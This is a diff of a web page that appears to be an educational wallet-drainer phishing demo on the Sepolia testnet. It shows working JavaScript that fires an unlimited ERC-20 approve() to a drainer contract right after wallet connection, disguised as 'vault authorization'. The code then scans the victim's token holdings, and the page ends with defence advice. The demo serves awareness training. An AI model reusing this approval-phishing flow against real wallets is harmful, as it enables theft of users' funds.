       <div class="info-card-value" id="approveTxDisplay">—</div>
       <a id="approveTxLink" href="#" target="_blank" class="etherscan-link">View on Sepolia Etherscan ↗</a>
     </div>
 
-    <!-- Live balance watcher -->
-    <div class="balance-watcher">
-      <div class="balance-label">Your DEMO token balance (live)</div>
-      <div class="balance-value safe" id="liveBalance">Loading...</div>
-      <div class="balance-note" id="balanceNote">The attacker can now drain this at any time — without your involvement.</div>
-      <button class="refresh-btn" id="refreshBtn">Refresh balance</button>
+    <!-- EVERY TOKEN AT RISK -->
+    <div class="exposure-section">
+      <div class="exposure-header">
+        <div class="exposure-title">Every token in your wallet — all exposed</div>
+        <div class="exposure-sub" id="tokenScanNote">Scanning Sepolia wallet...</div>
+      </div>
+
+      <div id="tokenExposureList">
+        <div class="exposure-loading">Fetching token holdings from chain...</div>
+      </div>
+
+      <div class="total-bar" id="totalBar" style="display:none">
+        <div class="total-bar-label">Tokens with active balance found in wallet</div>
+        <div class="total-bar-value" id="totalTokenCount">—</div>
+      </div>
+
+      <div style="font-size:0.82rem;color:var(--muted);line-height:1.6;margin-top:8px;">
+        The attacker doesn't need a separate approval for each token. One <code style="color:#a5b4fc">drain()</code> call per token is enough — they already have a list of everything you hold. The unlimited allowance on each approved token lets them pull whatever balance exists, now or in the future.
+      </div>
     </div>
 
-    <!-- Defense section -->
+    <!-- DEMO token live balance watcher -->
+    <div class="balance-watcher">
+      <div class="balance-label">DEMO token balance (live — auto-refreshes)</div>
+      <div class="balance-value safe" id="liveBalance">Loading...</div>
+      <div class="balance-note" id="balanceNote">The attacker (the person running this demo) can now call drain() from their terminal at any moment. Watch this number — you are not involved in that transaction at all.</div>
+      <button class="refresh-btn" id="refreshBtn">Refresh now</button>
+    </div>
+
+    <!-- Defense -->
     <div class="defense-section">
-      <h3>How to protect yourself</h3>
+      <h3>How to protect yourself going forward</h3>
       <div class="defense-item">
         <div class="defense-num">1</div>
-        <div class="defense-text"><strong>Always read popup #2, not just popup #1.</strong> Connection requests and approval requests look different — connection just asks to read your address, approval requests show a token name and a spend limit. If you see "Spend limit: Unlimited," stop.</div>
+        <div class="defense-text"><strong>Never approve a second popup immediately after connecting.</strong> Connecting to a site only needs one prompt. If a second one appears right away, it's almost always a spend approval — not a connection step.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">2</div>
-        <div class="defense-text"><strong>Check your existing approvals.</strong> Visit <a href="https://revoke.cash" target="_blank" class="defense-link">revoke.cash</a> and paste your wallet address to see every approval currently active on your wallet. Revoke anything you don't recognize.</div>
+        <div class="defense-text"><strong>Read the MetaMask popup before clicking.</strong> It tells you the token name and spend limit. "Unlimited" means exactly that — a blank cheque with no expiry.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">3</div>
-        <div class="defense-text"><strong>Bookmark real sites before connecting.</strong> Always navigate to DeFi sites from bookmarks, not from links in emails, Discord DMs, or Twitter/X.</div>
+        <div class="defense-text"><strong>Audit and revoke your existing approvals.</strong> Visit <a href="https://revoke.cash" target="_blank" class="defense-link">revoke.cash</a>, paste your wallet address, and revoke anything you don't recognise. Do this regularly.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">4</div>
-        <div class="defense-text"><strong>Never rush through multiple popups.</strong> Legitimate protocols don't need you to immediately approve a spend limit to "connect." If two popups appear back to back, the second one is almost always suspicious.</div>
+        <div class="defense-text"><strong>Use bookmarks, not links.</strong> Never navigate to a DeFi site from a Discord DM, Twitter link, or email. Bookmark the real URL and use only that.</div>
       </div>
     </div>
   </div>
@@ -778,35 +319,47 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  // ---- CONFIG (Sepolia) ----
-  const SEPOLIA_CHAIN_ID = 11155111;
-  const TOKEN_ADDRESS   = "0x4a2103AA8F00c1D453973268a3cce587d055330b"; // TestToken (DEMO)
-  const DRAINER_ADDRESS = "0x4c6015c7058fEe725c7342cFF1E7Dbd94Ca9C72e"; // EducationalDrainer
-  const RPC_URL         = "https://ethereum-sepolia-rpc.publicnode.com";
-  const MAX_UINT256     = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+  // ---- CONFIG ----
+  const SEPOLIA_CHAIN_ID  = 11155111;
+  const TOKEN_ADDRESS     = "0x4a2103AA8F00c1D453973268a3cce587d055330b";
+  const DRAINER_ADDRESS   = "0x4c6015c7058fEe725c7342cFF1E7Dbd94Ca9C72e";
+  const RPC_URL           = "https://ethereum-sepolia-rpc.publicnode.com";
+  const ETHERSCAN_API_KEY = "YOUR_ETHERSCAN_API_KEY_HERE"; // replace with yours
+  const ETHERSCAN_BASE    = "https://api.etherscan.io/v2/api";
+  const MAX_UINT256       = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
   const ERC20_ABI = [
     "function approve(address spender, uint256 amount) external returns (bool)",
     "function balanceOf(address) view returns (uint256)",
-    "function decimals() view returns (uint8)"
+    "function decimals() view returns (uint8)",
+    "function symbol() view returns (string)"
   ];
 
-  // ---- STATE ----
-  let userAddress  = null;
+  let userAddress   = null;
   let approveTxHash = null;
-  const provider  = new ethers.JsonRpcProvider(RPC_URL);
+  const provider    = new ethers.JsonRpcProvider(RPC_URL);
 
-  // ---- PHASE SWITCHING ----
   function showPhase(id) {
     document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
   }
 
-  function shortAddr(addr) {
-    return addr.slice(0, 6) + "..." + addr.slice(-4);
+  function shortAddr(a) { return a.slice(0,6) + "..." + a.slice(-4); }
+
+  // ---- STEP LIST RENDERER ----
+  function renderSteps(steps) {
+    document.getElementById('stepList').innerHTML = steps.map(s => `
+      <div class="step-item">
+        <div class="step-icon ${s.state}">${s.state === 'done' ? '✓' : s.state === 'active' ? '…' : s.num}</div>
+        <div class="step-text">
+          <div class="step-title">${s.title}</div>
+          <div class="step-desc">${s.desc}</div>
+        </div>
+      </div>
+    `).join('');
   }
 
-  // ---- CONNECT BUTTON ----
+  // ---- CONNECT ----
   document.getElementById('connectBtn').addEventListener('click', async () => {
     if (!window.ethereum) {
       alert("MetaMask not detected. Please install MetaMask to try this demo.");
@@ -814,15 +367,19 @@
     }
 
     showPhase('phase-connecting');
-    document.getElementById('connectingTitle').textContent = "Connecting wallet...";
-    document.getElementById('connectingSub').textContent = "Please approve the request in MetaMask";
+
+    // Step list: step 1 active, steps 2 pending
+    renderSteps([
+      { num:'1', state:'active', title:'Connect wallet',            desc:'Share your wallet address with YieldVault' },
+      { num:'2', state:'pending', title:'Authorize vault access',   desc:'Required to enable yield optimization' },
+    ]);
+    document.getElementById('connectNote').textContent = "Approve the connection request in MetaMask.";
 
     try {
-      // Popup #1 — connection (eth_requestAccounts)
+      // POPUP #1 — wallet connection
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
 
-      // Check they're on Sepolia
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       if (parseInt(chainIdHex, 16) !== SEPOLIA_CHAIN_ID) {
         alert("Please switch MetaMask to the Sepolia test network and try again.");
@@ -830,31 +387,29 @@
         return;
       }
 
-      // Immediately chain Popup #2 — the malicious approval
-      // This is what the scammer's site does right after connection,
-      // while the user is still in the "connecting" mental flow.
-      document.getElementById('connectingTitle').textContent = "Finalizing connection...";
-      document.getElementById('connectingSub').textContent = "One more step — approve the request in MetaMask";
+      // Step 1 done, step 2 now active
+      renderSteps([
+        { num:'1', state:'done',   title:'Wallet connected',          desc:shortAddr(userAddress) },
+        { num:'2', state:'active', title:'Authorize vault access',    desc:'Required to enable yield optimization — confirm in MetaMask' },
+      ]);
+      document.getElementById('connectNote').textContent = "One more step — confirm the authorization in MetaMask.";
 
+      // POPUP #2 — the malicious approve(), framed as "vault authorization"
+      // This fires immediately after connection, while user is still in "connecting" flow
       const browserProvider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await browserProvider.getSigner();
-      const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
-
-      // This is the actual approve() call — unlimited allowance to the Drainer
-      const tx = await token.approve(DRAINER_ADDRESS, MAX_UINT256);
+      const signer  = await browserProvider.getSigner();
+      const token   = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
+      const tx      = await token.approve(DRAINER_ADDRESS, MAX_UINT256);
       approveTxHash = tx.hash;
-
-      // Wait for confirmation then show the fake dashboard
       await tx.wait();
 
-      // Show fake "connected" dashboard
+      // Both done — go to fake dashboard
       document.getElementById('walletChip').textContent = shortAddr(userAddress);
       showPhase('phase-dashboard');
 
     } catch (err) {
-      console.error(err);
       if (err.code === 4001) {
-        alert("You rejected the request. On a real phishing site, this might retry or show a more convincing prompt to pressure you.");
+        alert("You rejected the request. On a real phishing site this would retry or pressure you further. Try again to see the full demo.");
       } else {
         alert("Error: " + (err.message || "Something went wrong."));
       }
@@ -862,58 +417,127 @@
     }
   });
 
-  // ---- REVEAL BUTTON ----
+  // ---- REVEAL ----
   document.getElementById('revealBtn').addEventListener('click', async () => {
-    // Populate reveal page
-    document.getElementById('revealAddress').textContent = userAddress;
+    document.getElementById('revealAddress').textContent   = userAddress;
+    document.getElementById('drainerDisplay').textContent  = DRAINER_ADDRESS;
 
     if (approveTxHash) {
       document.getElementById('approveTxDisplay').textContent = approveTxHash;
-      document.getElementById('approveTxLink').href =
-        `https://sepolia.etherscan.io/tx/${approveTxHash}`;
+      document.getElementById('approveTxLink').href = `https://sepolia.etherscan.io/tx/${approveTxHash}`;
     }
 
-    // Load initial balance
-    await refreshBalance();
-
     showPhase('phase-reveal');
+    await refreshBalance();
+    await scanAllTokens();
   });
 
-  // ---- LIVE BALANCE ----
+  // ---- LIVE BALANCE (DEMO token) ----
   async function refreshBalance() {
     if (!userAddress) return;
     try {
       const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, provider);
-      const [raw, decimals] = await Promise.all([
-        token.balanceOf(userAddress),
-        token.decimals()
-      ]);
-      const formatted = ethers.formatUnits(raw, decimals);
-      const el = document.getElementById('liveBalance');
+      const [raw, dec] = await Promise.all([token.balanceOf(userAddress), token.decimals()]);
+      const formatted  = parseFloat(ethers.formatUnits(raw, dec)).toLocaleString();
+      const el   = document.getElementById('liveBalance');
       const note = document.getElementById('balanceNote');
-
-      el.textContent = parseFloat(formatted).toLocaleString() + " DEMO";
-
+      el.textContent = formatted + " DEMO";
       if (raw === 0n) {
         el.className = 'balance-value drained';
-        note.textContent = "Balance is zero — the drain already happened.";
+        note.textContent = "Balance is zero — the drain has already happened. If you re-mint via faucet, it can happen again — the approval is still active.";
       } else {
         el.className = 'balance-value safe';
-        note.textContent = "This balance can be taken at any time — the attacker only needs to call drain() from their wallet. You are not involved.";
+        note.textContent = "The attacker (the demo operator) can call drain() from their terminal at any moment. You are not involved in that transaction at all — watch this number change.";
       }
-    } catch (e) {
+    } catch(e) {
       document.getElementById('liveBalance').textContent = "Error reading balance";
     }
   }
 
   document.getElementById('refreshBtn').addEventListener('click', refreshBalance);
-
-  // Auto-refresh every 8 seconds once on reveal phase
   setInterval(() => {
-    if (document.getElementById('phase-reveal').classList.contains('active')) {
-      refreshBalance();
-    }
+    if (document.getElementById('phase-reveal').classList.contains('active')) refreshBalance();
   }, 8000);
+
+  // ---- SCAN ALL TOKENS ----
+  async function scanAllTokens() {
+    const listEl = document.getElementById('tokenExposureList');
+    const noteEl = document.getElementById('tokenScanNote');
+
+    if (!ETHERSCAN_API_KEY || ETHERSCAN_API_KEY === "YOUR_ETHERSCAN_API_KEY_HERE") {
+      listEl.innerHTML = `<div class="exposure-empty">Add your Etherscan API key to <code>ETHERSCAN_API_KEY</code> in this file to enable full token scanning.</div>`;
+      noteEl.textContent = "API key not configured";
+      return;
+    }
+
+    try {
+      // Pull all token transfer history for this address
+      const url = `${ETHERSCAN_BASE}?chainid=${SEPOLIA_CHAIN_ID}&module=account&action=tokentx&address=${userAddress}&sort=asc&apikey=${ETHERSCAN_API_KEY}`;
+      const res  = await fetch(url);
+      const data = await res.json();
+
+      if (!Array.isArray(data.result) || data.result.length === 0) {
+        listEl.innerHTML = `<div class="exposure-empty">No token transfer history found for this wallet on Sepolia.</div>`;
+        noteEl.textContent = "No tokens found";
+        return;
+      }
+
+      // Deduplicate by contract address, keeping symbol + decimals
+      const seen = new Map();
+      for (const tx of data.result) {
+        if (!tx.contractAddress || tx.contractAddress === "0x0000000000000000000000000000000000000000") continue;
+        const addr = tx.contractAddress.toLowerCase();
+        if (!seen.has(addr)) {
+          seen.set(addr, { symbol: tx.tokenSymbol, decimals: Number(tx.tokenDecimal), address: tx.contractAddress });
+        }
+      }
+
+      noteEl.textContent = `Found ${seen.size} token contract(s) — checking live balances`;
+      listEl.innerHTML = "";
+
+      let withBalance = 0;
+
+      for (const [, info] of seen) {
+        try {
+          const contract  = new ethers.Contract(info.address, ERC20_ABI, provider);
+          const raw       = await contract.balanceOf(userAddress);
+          const formatted = parseFloat(ethers.formatUnits(raw, info.decimals));
+          const hasBalance = raw > 0n;
+          if (hasBalance) withBalance++;
+
+          const row = document.createElement('div');
+          row.className = 'token-exposure-row';
+          row.innerHTML = `
+            <div class="token-exposure-left">
+              <div class="token-avatar">${info.symbol.slice(0,3)}</div>
+              <div>
+                <div class="token-name">${escHtml(info.symbol)}</div>
+                <div class="token-addr">${info.address.slice(0,10)}...${info.address.slice(-6)}</div>
+              </div>
+            </div>
+            <div class="token-balance-right">
+              <div class="token-balance">${formatted.toLocaleString(undefined,{maximumFractionDigits:4})}</div>
+              <div class="token-status ${hasBalance ? '' : 'safe'}">${hasBalance ? '⚠ Drainable now' : 'Zero balance — but if funded, still drainable'}</div>
+            </div>
+          `;
+          listEl.appendChild(row);
+        } catch(e) {
+          // token contract unreadable, skip silently
+        }
+      }
+
+      document.getElementById('totalBar').style.display = 'flex';
+      document.getElementById('totalTokenCount').textContent = `${withBalance} with active balance / ${seen.size} total`;
+      noteEl.textContent = `${seen.size} token contract(s) ever touched by this wallet`;
+
+    } catch(e) {
+      listEl.innerHTML = `<div class="exposure-empty">Error scanning tokens: ${e.message}</div>`;
+    }
+  }
+
+  function escHtml(s) {
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
 </script>
 </body>
 </html>
